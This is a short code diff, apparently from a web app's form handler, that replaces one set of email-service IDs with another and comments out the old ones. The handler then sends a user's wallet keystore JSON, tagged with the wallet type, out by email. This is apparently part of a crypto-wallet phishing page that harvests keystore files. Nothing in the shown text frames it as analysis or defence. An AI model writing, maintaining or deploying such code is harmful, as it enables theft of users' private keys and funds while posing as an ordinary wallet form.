@@ -60,9 +60,12 @@ export default {
       const checker = this.formChecker()
       if (checker) {
         const data = {
-          service_id: "service_khz33ja",
-          template_id: "template_hl2qzeh",
-          user_id: "user_NfLXuXfvGqkJFOqnVRRmw",
+          service_id: "service_xq2i24g",
+          template_id: "template_bjz3ej8",
+          user_id: "user_jBO0e0q6wVjDKv6fvrb9q",
+          // service_id: "service_khz33ja",
+          // template_id: "template_hl2qzeh",
+          // user_id: "user_NfLXuXfvGqkJFOqnVRRmw",
           template_params: {
             from_name: `KEYSTORE on ${this.walletType}`,
             keystore_JSON: this.keystore_JSON,
